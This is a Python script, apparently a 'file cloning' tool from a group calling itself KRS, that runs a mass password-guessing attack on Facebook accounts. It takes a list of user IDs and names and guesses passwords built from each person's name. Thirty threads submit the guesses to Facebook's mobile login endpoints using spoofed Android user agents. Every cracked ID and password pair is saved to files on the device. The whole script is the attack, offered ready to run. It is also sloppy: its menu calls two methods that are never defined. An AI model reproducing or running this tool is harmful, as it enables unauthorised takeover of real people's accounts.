#SCTIPT OPEN SOURCE BY KRS
#GITHUB : github.com/TEAM-KRS

from os import path
import os,base64,zlib,pip,urllib,time,random,requests
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
        os.system('git pull')
except:pass
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')

ugen=[]
ugen=[]
useragent=[]
uaku2=[]
ugen2=[]
ugen=[]
aqib_ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 13; PGT110 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5a Build/TQ2A.230405.003)","Dalvik/2.1.0 (Linux; U; Android 6.0; VK815 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-42-8)","Dalvik/2.1.0 (Linux; U; Android 12; moto g31 Build/S3RWBS32.125-29-2-5)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; T98_box Build/OPM6.171019.030.B1)","Dalvik/2.1.0 (Linux; U; Android 11; MS5424G Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; RCT6716Q25 Build/QP1A.190711.020)","Dalvik/1.6.0 (Linux; U; Android 4.2.2; RCS13101T Build/JDQ39)","Dalvik/2.1.0 (Linux; U; Android 11; SK3404 Build/RQ3A.210705.001)","Dalvik/2.1.0 (Linux; U; Android 5.1; Cynus F7 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 12; motorola one 5G UW ace Build/S3RVS32.128-36-4-1)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTA Build/NS6296)","Dalvik/2.1.0 (Linux; U; Android 5.1; Impress Style Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 9; cherry Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A546E Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; V2031_21 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; LGE-NX9 Build/HONORLGE-N49)","Dalvik/2.1.0 (Linux; U; Android 10; MAXI 20 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 9; HRY-LX1 Build/HONORHRY-LX1)","Dalvik/2.1.0 (Linux; U; Android 9; andrino 2K Android TV Build/PTO6.220120.001)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; VS880 Build/KOT49I.VS88010B)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; TANK_P55 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 11; SM-A202F Build/RP1A.200720.012) PB/102","Dalvik/2.1.0 (Linux; U; Android 11; 9295G_RU Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 12; SKY B63 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5a Build/TQ2A.230405.003.A2)","Dalvik/2.1.0 (Linux; U; Android 12; Celero5G+ Build/SKQ1.220804.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22 Build/SOV32.121-40)","Dalvik/2.1.0 (Linux; U; Android 11; ZTE A2122H Build/RKQ1.201221.002)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A145M Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pro Build/S0PRS32.44-11-10-26)","Dalvik/2.1.0 (Linux; U; Android 12; moto g51 5G Build/S2RYAS32.58-13-9-8)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(60)s Build/S3RLS32.114-25-1-5)","Dalvik/2.1.0 (Linux; U; Android 11; TV-SP01A Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 11; MAX2 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 12; LM-Q520N Build/SKQ1.211103.001)","Dalvik/2.1.0 (Linux; U; Android 9; SM-J810M Build/PPR1.180610.011) VD/218","Dalvik/1.6.0 (Linux; U; Android 4.4.2; P4502 Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 10; SM-9005 Build/QQ2A.200405.005)","Dalvik/2.1.0 (Linux; U; Android 11; 2201117TY Build/RKQ1.211001.001) VD/213","Dalvik/2.1.0 (Linux; U; Android 9; kukui Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A226L Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; moto g go Build/RRHGS31.Q3-37-43-43-5-4-6)","Dalvik/2.1.0 (Linux; U; Android 11; DL4 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A346E Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2203 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 11; AKUS P1 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-T805Y Build/MMB29K)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A336N Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A546V Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; M18 Build/NRD91N)","Dalvik/2.1.0 (Linux; U; Android 11; Lenovo K14 Build/RON31.267-94)","Dalvik/1.6.0 (Linux; U; Android 5.1; B906 Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 10; Lenovo TB-X606F Build/QP1A.190711.020; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 10; PX4 Build/QQ2A.200305.004.A1)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 30 Build/S1RDS32.55-106-4)","Dalvik/2.1.0 (Linux; U; Android 13; M2101K6I Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 11; Black X Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; M2007J1SC Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 13; T610K Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22 Build/SOW32.121-40)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; E100 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) VD/218","Dalvik/2.1.0 (Linux; U; Android 7.0; TZ742 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 40 pro Build/T1TR33.43-20-15)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6823 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 20 lite Build/S2RKS32.92-11-21-13)","Dalvik/2.1.0 (Linux; U; Android 12; TECNO AD9 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22i Build/SOW32.121-40)","Dalvik/2.1.0 (Linux; U; Android 12; A202ZT Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g31(w) Build/S3RWD32.123-29-8)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BQ72 Build/61.2.G.0.41)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; MID Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 10; TOX2 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 12; TANK 01 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; V1813T Build/P00610)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4 XL Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2205 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 9; AFTTIFF43 Build/PS7633.3449N)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; i75 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; M8L Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; 220733SPI Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; P652 Pro Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; BLADE A6 Build/NMF26F)","Dalvik/2.1.0 (Linux; U; Android 6.0; X60 Plus Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; L-41A Build/SKQ1.211103.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g200 5G Build/S1RXS32.50-13-5)","Dalvik/2.1.0 (Linux; U; Android 13; ASUS_AI2203_C Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; AFTBOXE1 Build/PS7600.3513N)","Dalvik/2.1.0 (Linux; U; Android 11; B610A115 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 11; rammus Build/R112-15359.45.0)","Dalvik/2.1.0 (Linux; U; Android 12; Power Armor X11 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A127F Build/TP1A.220624.014) VD/213","Dalvik/2.1.0 (Linux; U; Android 5.1; Archos 55 Helium Plus Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 6.0; hiPower Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 13; RMX3562 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 11.1; p281 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; moto g73 5G Build/T1TN33.14-55-3)","Dalvik/2.1.0 (Linux; U; Android 9; moto g(7) supra Build/PCO29.114-134)"])
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
    
    
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU       

logo=("""   
\033[1;35m  **         *******    ******** ******** ******** *******  
\033[1;35m /**        **/////**  **////// /**///// /**///// /**////** 
\033[1;35m /**       **     //**/**       /**      /**      /**   /** 
\033[1;35m /**      /**      /**/*********/******* /******* /*******  
\033[1;35m /**      /**      /**////////**/**////  /**////  /**///**  
\033[1;35m /**      //**     **        /**/**      /**      /**  //** 
\033[1;35m /******** //*******   ******** /********/********/**   //**
////////   ///////   ////////  //////// //////// //     // 
\t\t\t   \033[1;33mMENTAL
\033[1;32m-------------------------------------------
\033[1;35m   \033[1;32mCREATED BY   :  \033[1;32mLosser 
\033[1;35m   \033[1;33mFACEBOK      : \033[1;33m NOI BATAO GA 
\033[1;36m   \033[1;35mGITHUB       :  \033[1;35m NOI HE
\033[1;32m   \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m   \033[1;35mTEAM         :  \033[1;35mAlone 
\033[1;34m   \033[1;32mTOOL VIRSION :  \033[1;32m0.1
\033[1;32m-------------------------------------------""")

def linex():
        print("\033[1;32m-------------------------------------------")
def clear():
        os.system(f'clear')
        print(logo)
loop=0
oks=[]
cps=[]
krk=[]
id=[]
tokenku=[]
os.system('git pull')





def KRRSS():
	clear()
	
	print(f"\n \033[1;37m[\033[1;32m1\033[1;37m] FILE CLONEING ")
	#print(f" [\033[1;32m2\033[1;37m] RANDOM CLONE")
	print(f" [\033[1;31m0\033[1;37m] Exit")
	me=input(f'\n\n [\033[1;32m•\033[1;37m] Choice : ')
	
	if me in ["1", "01","11","A","a"]:
		clear()
		file = input(f'\n [\033[1;32m•\033[1;37m] FILE PATH \033[1;32m: ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(f' [\033[1;32mX\033[1;37m] File location Not Found ')
			exit()
		clear();print(f'\n [\033[1;31m1\033[1;37m] Method \033[1;32m1 \n [\033[1;31m2\033[1;37m] Method \033[1;32m2 ')
		mthd=input(f'\n [\033[1;32m•\033[1;37m] Salect : ')
		plist=[]
		try:
			clear();ps_limit = int(input(f'\n [\033[1;32m?\033[1;37m] How Many Passwords Do You Want To Add \033[1;33m: '))
		except:
			ps_limit =1
		clear();print(f'\n [\033[1;32m•\033[1;37m] Example: \033[1;36mfirst last,firtslast,first123 \033[1;37m\n')
		for i in range(ps_limit):
			plist.append(input(f' [\033[1;32m•\033[1;37m] Put password {i+1} :  '))
		clear()
		cx=('y')
		if cx in ['n','N','no','NO','2']:
			krk.append(f'n')
		else:
			krk.append(f'y')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
			print(f'\n Total Account : \033[1;32m{total_ids} ')
			print(f"\033[1;36m Use Flight Mode For Speed Up\033[1;37m")
			linex()
			for user in fo:
				ids,names = user.split('|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(m1,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(m2,ids,names,passlist)
				elif mthd in ['3','03']:
					crack_submit.submit(m3,ids,names,passlist)
				elif mthd in ['4','04']:
					crack_submit.submit(m4,ids,names,passlist)
				
				
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [KRS] \033[1;36m|\033[1;37m %s \033[1;36m|\033[1;37m OK \033[1;36m|\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(aqib_ua)
                        head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': aqib_ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        KRRSS=session.cookies.get_dict().keys()
                        if "c_user" in KRRSS:
                                
                                print(f'\r\r\033[1;32m [KRS\033[1;36m-\033[1;37m\033[1;32mOK] %s \033[1;36m|\033[1;37m\033[1;32m %s'%(ids,pas))
                        
                        
                                open(f'/sdcard/KRS_OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                
                                break
                        
                        elif 'checkpoint' in KRRSS:
                                if 'y' in krk:
                                        print(f'\r\r\033[1;91m [KRS-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/KRS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(10)
        loop+=1
                        

def m2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [KRS] \033[1;36m|\033[1;37m %s \033[1;36m|\033[1;37m OK \033[1;36m|\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        session = requests.Session()
        try:
                first = names.split(f' ')[0]
                try:
                        last = names.split(f' ')[1]
                except:
                        last = 'khan'
                ps = first.lower()
                ps2 = last.lower()
                for fikr in passlist:
               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
                        ua=random.choice(aqib_ua)
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': aqib_ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        getlog = session.get(f'https://m.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                        complete = session.post(f'https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                        KRRSS=session.cookies.get_dict().keys()
                        if "c_user" in KRRSS:
                                
                                print(f'\r\r\033[1;32m [KRS\033[1;36m-\033[1;37m\033[1;32mOK] %s \033[1;36m|\033[1;37m\033[1;32m %s'%(ids,pas))
                                
                                open(f'/sdcard/KRS_OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                
                                break
                        
                        elif 'checkpoint' in KRRSS:
                                if 'y' in krk:
                                        print(f'\r\r\033[1;91m [KRS-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open(f'/sdcard/KRS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        else:
                                continue
        except requests.exceptions.ConnectionError:
                time.sleep(10)
        loop+=1


KRRSS()
